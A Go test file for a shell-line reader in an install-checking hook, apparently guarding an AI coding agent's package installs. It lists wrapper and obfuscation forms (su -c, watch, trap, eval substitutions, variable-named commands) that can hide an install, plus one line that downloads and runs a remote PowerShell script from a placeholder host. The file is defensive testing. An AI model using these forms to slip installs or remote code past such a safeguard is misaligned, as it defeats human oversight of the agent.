package installread

import (
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/alalanet/alalanet-agent/internal/costtest"
)

// READER-SHELLS (ADR-0159, round 5): commands that run other commands the way a shell does. Each line below runs
// `npm i zz-shells-pkg` or `npx -y zz-shells-pkg` (a placeholder) as its shell runs it. On 7b53831 every one of them was
// silent: no target from ParseLine, no reason from either reader — the hook answers nothing, which Claude Code takes
// for allow, and alalanet-agent does not send the line at all.

const shellsPkg = "npm:zz-shells-pkg"

// Read as the shell runs them: the script of a POSIX-like shell's -c, su -c, script, flock, watch, trap, cmd's call
// and start, busybox — the target the same script gives under sh -c, and nothing unread.
func TestReaderShellsReadAsTheShellRunsThem(t *testing.T) {
	for _, line := range []string{
		"ksh -c 'npm i zz-shells-pkg'",
		"ksh93 -c 'npx -y zz-shells-pkg'",
		"mksh -c 'npm i zz-shells-pkg'",
		"/bin/ash -c 'npm i zz-shells-pkg'",
		"yash -c 'npm i zz-shells-pkg'",
		"busybox sh -c 'npm i zz-shells-pkg'",
		"/bin/busybox ash -c 'npx -y zz-shells-pkg'",
		"su -c 'npm i zz-shells-pkg'",
		"su root -c 'npm i zz-shells-pkg'",
		"su - root -c 'npx -y zz-shells-pkg'",
		"su -lc 'npm i zz-shells-pkg' root",
		"su --command='npm i zz-shells-pkg'",
		"su -c 'A=1 npm i zz-shells-pkg'", // a script with an "=" is still a script (READER-EQ-1's shape)
		"sudo su -c 'npm i zz-shells-pkg'",
		"script -c 'npm i zz-shells-pkg' /dev/null",
		"script -qc 'npx -y zz-shells-pkg' /dev/null",
		"script --command='npm i zz-shells-pkg' /dev/null",
		"script -q /dev/null npm i zz-shells-pkg", // macOS and BSD: the command follows the file
		"script -t 0 /dev/null npm i zz-shells-pkg",
		"flock /tmp/zz.lock -c 'npm i zz-shells-pkg'",
		"flock -w 5 /tmp/zz.lock npm i zz-shells-pkg",
		"flock -xn /tmp/zz.lock npx -y zz-shells-pkg",
		"watch 'npm i zz-shells-pkg'",
		"watch 'A=1 npm i zz-shells-pkg'",
		"watch -n 5 npm i zz-shells-pkg",
		"watch -n1 -- npx -y zz-shells-pkg",
		"watch -x npm i zz-shells-pkg",
		"trap 'npm i zz-shells-pkg' EXIT",
		"trap -- 'A=1 npx -y zz-shells-pkg' INT TERM",
		"call npm i zz-shells-pkg",
		"cmd /c call npm i zz-shells-pkg",
		"start npx -y zz-shells-pkg",
		`start "" /b npx -y zz-shells-pkg`,
		"cmd /c start /wait npx -y zz-shells-pkg",
		`start /D C:\zz npx -y zz-shells-pkg`,
		`sh -c "su -c 'npm i zz-shells-pkg'"`,
		// bash/sh/… take options and -- after -c; the script is the first word that is not an option (P2-1)
		"bash -c -- 'npm i zz-shells-pkg'",
		"sh -c -e 'npm i zz-shells-pkg'",
		"bash -c -o pipefail 'npx -y zz-shells-pkg'",
		"ksh -c +x 'npm i zz-shells-pkg'",
		// util-linux script permutes its options: the log file before -c (P2-2)
		"script log -c 'npm i zz-shells-pkg'",
		"script -a log -c 'npx -y zz-shells-pkg'",
		"script log --command='npm i zz-shells-pkg'",
		// a foreign shell's script with no character where it differs from POSIX is a checked target (P3-3)
		"fish -c 'npm i zz-shells-pkg'",
		`fish -c "npx -y zz-shells-pkg"`,
		"fish -C 'npm i zz-shells-pkg'",
		"fish --command='npm i zz-shells-pkg'",
		"tcsh -c 'npm i zz-shells-pkg'",
		"csh -fc 'npm i zz-shells-pkg'",
		"iex 'npm i zz-shells-pkg'",
		"Invoke-Expression -Command 'npx -y zz-shells-pkg'",
		`pwsh -Command "iex 'npm i zz-shells-pkg'"`,
		"su -s /usr/bin/fish -c 'npm i zz-shells-pkg'",
		// a command_string that is one quoted word beginning with "-" is the script, not an option (P2-1)
		"bash -c '-x; npm i zz-shells-pkg'",
		// arch and zsh's nocorrect run the command in their words (P3-4)
		"arch -x86_64 npm i zz-shells-pkg",
		"arch -arm64 npx -y zz-shells-pkg",
		"arch -arch arm64 npm i zz-shells-pkg",
		"nocorrect npm i zz-shells-pkg",
	} {
		tg, un, _, _ := ParseLine(line)
		if !slices.Contains(tg, shellsPkg) || len(un) > 0 {
			t.Errorf("%q: targets %q, unread %q; want %s and nothing unread", line, tg, un, shellsPkg)
		}
	}
}

// What alalanet cannot read is a reason: a shell with a syntax of its own, PowerShell's Invoke-Expression, a script
// fed to a shell's input or given as a <(…) file, a command whose name comes from a command substitution or a
// variable. Whichever reader gives it, the hook asks.
func TestReaderShellsGiveAReason(t *testing.T) {
	for line, want := range map[string]string{
		"fish -c 'n(echo p)m i zz-shells-pkg'":                                  whyScript, // fish's own command substitution
		"iex '(npm i zz-shells-pkg)'":                                           whyScript, // a PowerShell grouping
		`iex "& { $(irm https://example.invalid/i.ps1) }; npm i zz-shells-pkg"`: whyScript, // the line's own install (R3-6)
		`iex "& $(Get-Command npm) i zz-shells-pkg"`:                            whyScript, // PowerShell's call operator (R5-2)
		`iex "$($a='npm'); & $a i zz-shells-pkg"`:                               whyScript,
		`iex "$(1); & ('np'+'m') i zz-shells-pkg"`:                              whyScript,
		`iex "$(Get-Content x); n(echo p)m i zz-shells-pkg"`:                    whyScript,
		`iex "$(x) | iex"`:                                                      whyScript,
		"echo 'npm i zz-shells-pkg' | sh":                                       whyScript,
		"echo npm i zz-shells-pkg | bash":                                       whyScript,
		`printf 'npx -y zz-shells-pkg\n' | sh`:                                  whyScript,
		"echo 'npm i zz-shells-pkg' | tee /dev/null | sh":                       whyScript,
		"echo 'npm i zz-shells-pkg' | sudo bash -s zz-arg":                      whyScript,
		"echo 'n(echo p)m i zz-shells-pkg' | fish":                              whyScript,
		"echo 'npm i zz-shells-pkg' | fish":                                     whyScript,
		"bash <<< 'npm i zz-shells-pkg'":                                        whyScript,
		"cat <<< 'npm i zz-shells-pkg' | sh":                                    whyScript,
		"source /dev/stdin <<< 'npm i zz-shells-pkg'":                           whyScript,
		"source <(echo npm i zz-shells-pkg)":                                    whyScript,
		". <(echo npx -y zz-shells-pkg)":                                        whyScript,
		"bash <(echo npm i zz-shells-pkg)":                                      whyScript,
		`eval "$(echo npx -y zz-shells-pkg)"`:                                   whySubstCommand,
		"eval $(echo npx -y zz-shells-pkg)":                                     whySubstCommand,
		"eval `echo npx -y zz-shells-pkg`":                                      whySubstCommand,
		"$(echo npx) -y zz-shells-pkg":                                          whySubstCommand,
		"n$(echo p)m i zz-shells-pkg":                                           whySubstCommand,
		"$(pyenv which python) -m pip install zz-shells-pkg":                    whySubstCommand,
		"n${E}pm i zz-shells-pkg":                                               whyVarCommand,
		"${X:-npm --zz=1} i zz-shells-pkg":                                      whyVarCommand, // a :- default with an "=" in it (R2-4)
		"${NPX:-npx} -y zz-shells-pkg":                                          whyVarCommand,
		"${X:+npx} -y zz-shells-pkg":                                            whyVarCommand,
		"$E npm i zz-shells-pkg":                                                whyVarCommand,
		"$PYTHON -m pip install zz-shells-pkg":                                  whyVarCommand,
		"$SHELL -c 'npm i zz-shells-pkg'":                                       whyVarCommand,
		"${X:-/usr/bin/npx} -y zz-shells-pkg":                                   whyVarCommand,
		"sudo n${E}pm i zz-shells-pkg":                                          whyVarCommand,
		"sh -c 'n${E}pm i zz-shells-pkg'":                                       whyVarCommand,
	} {
		tg, un, _, s := ParseLine(line)
		all := append(append([]string(nil), un...), HookExtra(line, tg, un, s)...)
		if !slices.ContainsFunc(all, func(r string) bool { return strings.HasPrefix(r, want) }) {
			t.Errorf("%q: targets %q, reasons %q; want a reason %q", line, tg, all, want)
		}
	}
}

// The reasons have codes of their own where install_check signs them.
func TestReaderShellsReasonCodes(t *testing.T) {
	for msg, want := range map[string]string{
		whyScript + " (fish -c: npm i x)": "script_not_read",
		whyVarCommand + " (n${E}pm i x)":  "variable_argument",
		whySubstCommand + " ($(…) -y x)":  "command_substitution",
	} {
		if got := extraCode(msg); got != want {
			t.Errorf("%q: code %q, want %q", msg, got, want)
		}
	}
}

// Silent by design, as before: the line shows no install (a variable's or a file's script, a toolchain's init output,
// a program from a folder only), or what the forms run is harmless. A downloaded script it runs (curl … | sh, irm … |
// iex, iex "& { $(irm …) }") was here until PIPE-SCRIPT-1 made it a target (pipescript_test.go).
func TestReaderShellsSilentByDesign(t *testing.T) {
	for _, line := range []string{
		`eval "$X"`,
		"eval $X",
		". ./x.sh",
		"source ./x.sh",
		`eval "$(pyenv init -)"`,
		"$(npm bin)/eslint .",
		`"$(go env GOPATH)/bin/staticcheck" ./...`,
		"$HOME/.local/bin/zz-tool --help",
		"$CMD build",
		"fish -c 'echo hi'",
		"fish ./x.fish",
		"echo hi | sh",
		"echo 'npm i zz-shells-pkg' || sh",
		"echo 'npm i zz-shells-pkg'; sh",
		"echo 'npm i zz-shells-pkg' | bash ./x.sh",
		"echo 'npm i zz-shells-pkg' | cat notes.txt | sh",
		"trap 'npm i zz-shells-pkg'", // one word is a condition: trap resets it
		"$PATH npx -y zz-shells-pkg", // runs a program named by PATH's value
		"$HOME/bin/zz-tool -c 'npm i zz-shells-pkg'",
		"echo 'npm i zz-shells-pkg' | cat\nsh", // a new line ends the pipeline
		"echo 'npm i zz-shells-pkg' > notes.txt",
		"trap - INT",
		"trap 'rm -f /tmp/zz.lock' EXIT",
		"su - root",
		`start "zz title"`,
		"call :zzlabel",
		"watch -n 5 ls",
		"flock /tmp/zz.lock make",
		"script -q /dev/null",
		"busybox ls",
		"ksh ./x.ksh",
		"bash --command='npm i zz-shells-pkg'",    // bash has no --command: it shows bash no install (P2-1)
		"echo 'npm i zz-shells-pkg' | sudo -s ls", // sudo -s ls runs ls, not a login shell reading the pipe (P3-1)
		"$(echo npm) ci",                          // npm ci: an install form with nothing named to check (P3-2)
		// a foreign shell or iex script with no install, read as POSIX because it has no divergent character (P3-3)
		"fish -c 'npm test'",
		"fish -c 'git status'",
		"iex 'npm test'",
		`iex "dotnet build"`,
		"iex $env:1",                          // any $env: reference is one variable (R2-5)
		`iex "$(Get-Content x.ps1) -Verbose"`, // only plain words around the subexpression (R5-2)
		"iex 'not npm i zz-shells-pkg'",       // PowerShell has no not: the keywords are fish's only (R2-1)
		"iex $cmd",                            // a bare variable, as eval \"$X\" is (P3-3)
		"iex $profile",
		`iex "$x"`,
		// honest lines a variable or a lookup must not make ask (P3-2)
		"${NPM:-npm} ci",
		"${PYTHON:-python3} -m venv .venv",
		"${UV:-uv} run pytest",
		"$(pyenv which python) -m pytest",
		"$(pyenv which python) -V",
		"type -P npm && $(type -P npm) run build",
	} {
		tg, un, _, s := ParseLine(line)
		if ex := HookExtra(line, tg, un, s); len(tg)+len(un)+len(ex) > 0 {
			t.Errorf("%q: targets %q, unread %q, extra %q; want nothing", line, tg, un, ex)
		}
	}
}

// The second reader reads the same scripts: what it says of a script under sh -c it says under these forms too.
func TestReaderShellsSecondReaderReadsTheScripts(t *testing.T) {
	const script = "npm_config_script_shell=/tmp/zz npx -y zz-shells-pkg"
	control := "sh -c '" + script + "'"
	ctg, cun, _, cs := ParseLine(control)
	want := HookExtra(control, ctg, cun, cs)
	if len(want) == 0 {
		t.Fatal("the control line gives no reason")
	}
	for _, line := range []string{
		"ksh -c '" + script + "'",
		"mksh -c '" + script + "'",
		"su -c '" + script + "'",
		"script -qc '" + script + "' /dev/null",
		"flock /tmp/zz.lock -c '" + script + "'",
		"watch '" + script + "'",
		"trap '" + script + "' EXIT",
		"busybox sh -c '" + script + "'",
	} {
		tg, un, _, s := ParseLine(line)
		if got := HookExtra(line, tg, un, s); !slices.Equal(got, want) {
			t.Errorf("%q: second reader %q, want %q (as under sh -c)", line, got, want)
		}
	}
}

// The command_substitution rule is bounded: the second reader costs at most readersBound times the first on a crafted
// line that names many commands by a mark against a long printed text (the cap bounds one reading; the work budget,
// the number of them). A relative bound, so it holds under -race and under load (P2-4; COST-WALLCLOCK-1). TestReaderShellsReviewSubstitutedNamesBounded pins the
// absolute shapes.
func TestReaderShellsSubstBounded(t *testing.T) {
	for _, line := range []string{
		"$(echo " + strings.Repeat("a", 60_000) + "); " + strings.Repeat("$(:) x; ", 300),                        // one long printed text, many marks
		"$(echo " + strings.Repeat("a", 40_000) + "); " + strings.Repeat("$(:) x; ", 2_000),                      // many marks re-reading the printed text
		strings.Repeat("$(echo sh -c '"+strings.Repeat("a;", 500)+"'); ", 100) + strings.Repeat("$(:) x; ", 500), // many texts × many marks: the budget bounds it (R4-1)
	} {
		ratio, de, dp := readersRatio(line)
		t.Logf("%d bytes: the second reader %v, the first %v (x%.2f)", len(line), de, dp, ratio)
		if ratio > readersBound {
			t.Errorf("%d bytes: the second reader took %v, the first %v: x%.1f, the bound is x%d", len(line), de, dp, ratio, readersBound)
		}
	}
}

// readersRatio: the second reader's cost on a line against the first reader's on it, measured interleaved as the least
// of five rounds (costtest.Against, COST-WALLCLOCK-1): a ratio in the host's own units, so that a loaded host slows both
// sides, where the bound was the first reader's time plus a second of the host's (make ci at load ~30 failed it, R4-6,
// R5-1). The second reader is measured on the first reader's own results, as the hook gives them.
func readersRatio(line string) (ratio float64, de, dp time.Duration) {
	tg, un, _, s := ParseLine(line)
	return costtest.Against(5, func() { HookExtra(line, tg, un, s) }, func() { ParseLine(line) })
}

// readersBound: the second reader costs at most this many times the first on the crafted lines below. Measured
// (COST-WALLCLOCK-1): at most x2.46 on an idle host and x4.20 under load; the P2-4 regression took 2.5 s against the
// first reader's tens of milliseconds, a ratio past 50 (replayed on 5248631: x19-134). A milder regression (+46 ms,
// x5) passes it, as it passed develop's "first reader plus 1 s".
const readersBound = 10

// A printed text that is itself a script of many short commands costs a reading per command, and the work budget is
// charged so (R5-1): k such texts and 500 commands named by a mark stay within readersBound times the first reader's
// cost (it was the first reader's time plus 250 ms of the host's, four times that under the race detector). Before, a
// 29 KB line took about half a second: the budget allowed ~1,000 readings of ~500 commands each.
func TestReaderShellsPrintedScriptsBounded(t *testing.T) {
	for _, k := range []int{25, 100} {
		line := strings.Repeat("$(echo sh -c '"+strings.Repeat("a;", 500)+"'); ", k) + strings.Repeat("$(:) x; ", 500)
		ratio, de, dp := readersRatio(line)
		t.Logf("%d texts (%d bytes): the second reader %v, the first %v (x%.2f)", k, len(line), de, dp, ratio)
		if ratio > readersBound {
			t.Errorf("%d texts (%d bytes): the second reader took %v, the first %v: x%.1f, the bound is x%d", k, len(line), de, dp, ratio, readersBound)
		}
	}
}

// OtherProgram (ECO-1) finds the program these forms run, as it does under sh -c.
func TestReaderShellsOtherProgram(t *testing.T) {
	for line, want := range map[string]string{
		"ksh -c 'cargo install zz-x'":           "cargo",
		"su -c 'cargo install zz-x'":            "cargo",
		"flock /tmp/zz.lock cargo install zz-x": "cargo",
		"watch -n 5 go install zz-x":            "go",
		"busybox sh -c 'gem install zz-x'":      "gem",
		"script -q /dev/null brew install zz-x": "brew",
		"busybox wget http://x":                 "wget",
		"busybox":                               "busybox", // alone, as before (P3-6)
		"toybox":                                "toybox",
	} {
		if got := OtherProgram(line); got != want {
			t.Errorf("OtherProgram(%q) = %q, want %q", line, got, want)
		}
	}
}

// What other rules read stays theirs: a PowerShell assignment, env given a substitution's output, a substitution that
// gives only the folder, one that runs an install itself.
func TestReaderShellsLeavesOtherReadings(t *testing.T) {
	reasons := func(line string) ([]string, []string) {
		tg, un, _, s := ParseLine(line)
		return tg, append(append([]string(nil), un...), HookExtra(line, tg, un, s)...)
	}
	has := func(all []string, prefix string) bool {
		return slices.ContainsFunc(all, func(r string) bool { return strings.HasPrefix(r, prefix) })
	}
	if _, all := reasons("$x = npx -y zz-shells-pkg"); has(all, whyVarCommand) || !has(all, whyThrough+"a PowerShell assignment") {
		t.Errorf("$x = npx …: reasons %q; want the PowerShell assignment's, not a variable command", all)
	}
	for _, line := range []string{
		"env $(cat .env | xargs) npx -y zz-shells-pkg",
		"$(echo /usr/local/bin)/npx -y zz-shells-pkg",
		"$(npm i zz-shells-pkg) zz-y",
	} {
		tg, all := reasons(line)
		if !slices.Contains(tg, shellsPkg) || has(all, whyVarCommand) || has(all, whySubstCommand) {
			t.Errorf("%q: targets %q, reasons %q; want the target and neither new reason", line, tg, all)
		}
	}
	// A parameter-expansion program word is not an assignment in either reader: the second reader does not read
	// ${X:=npm} as the command named by the assignment (whyCommand), it reads npm (P2-3, both readers).
	for _, line := range []string{"${X:=npm} i zz-shells-pkg", "n${E:=p}m i zz-shells-pkg"} {
		_, all := reasons(line)
		if has(all, whyCommand) || !has(all, whyVarCommand) {
			t.Errorf("%q: reasons %q; want the variable command's reason, not %q", line, all, whyCommand)
		}
	}
	// A NAME=${VAR} word whose "=" is outside the braces is an assignment, not a program: its registry stays read
	// (the "=" position, not just the presence of ${, tells them apart — P2-3).
	for _, line := range []string{
		"NPM_CONFIG_REGISTRY=${R} npm i zz-shells-pkg",
		"env A_CONFIG_REGISTRY=${R} npx -y zz-shells-pkg",
	} {
		tg, all := reasons(line)
		if !slices.Contains(tg, shellsPkg) || !has(all, "installs from a custom registry") || has(all, whyVarCommand) {
			t.Errorf("%q: targets %q, reasons %q; want the target and a custom-registry reason, not a variable command", line, tg, all)
		}
	}
}

// fish's and, or, not and tcsh's repeat N are dropped only where a command starts, with repeat's count (R2-1).
func TestReaderShellsStripForeignKeywords(t *testing.T) {
	for in, want := range map[string]string{
		"cd app; and npm i x":       "cd app;  npm i x",
		"not not npm i x":           "  npm i x",
		"repeat 2 npm i x":          "  npm i x",
		"npm i and or not":          "npm i and or not",
		"false\nor npm i x | not y": "false\n npm i x |  y",
		"echo repeat 3":             "echo repeat 3",
		"if not npm i x; end":       "if  npm i x; end",
		"else if not npm i x":       "else if  npm i x",
		"begin npm i x; end":        " npm i x; end",
		"echo if not":               "echo if not",
	} {
		if got := stripForeignKeywords(in); got != want {
			t.Errorf("stripForeignKeywords(%q) = %q, want %q", in, got, want)
		}
	}
}

// Printed texts past the count cap: one that starts with a launch word is the reason; others stay quiet, so an honest
// script with many $(echo …) and a command named by one of them asks nothing (R3-5).
func TestReaderShellsDroppedTextQuiet(t *testing.T) {
	pad := ""
	for i := 0; i < 8; i++ {
		pad += "echo $(echo zz" + string(rune('a'+i)) + "); "
	}
	line := pad + "$(echo zzi) --version"
	tg, un, _, s := ParseLine(line)
	if ex := HookExtra(line, tg, un, s); len(tg)+len(un)+len(ex) > 0 {
		t.Errorf("%q: targets %q, unread %q, extra %q; want nothing", line, tg, un, ex)
	}
}

// With no count cap, the 1 KiB clip keeps an honest line quiet: one long printed text read for each of many marked
// commands costs a KiB a reading, well inside the budget (R4-1); unclipped, the budget would run out and ask.
func TestReaderShellsLongPrintedTextQuiet(t *testing.T) {
	line := "$(echo " + strings.Repeat("a", 200_000) + "); " + strings.Repeat("$(:) x; ", 200)
	tg, un, _, s := ParseLine(line)
	if ex := HookExtra(line, tg, un, s); len(tg)+len(un)+len(ex) > 0 {
		t.Errorf("%d bytes: targets %q, unread %q, extra %q; want nothing", len(line), tg, un, ex)
	}
}
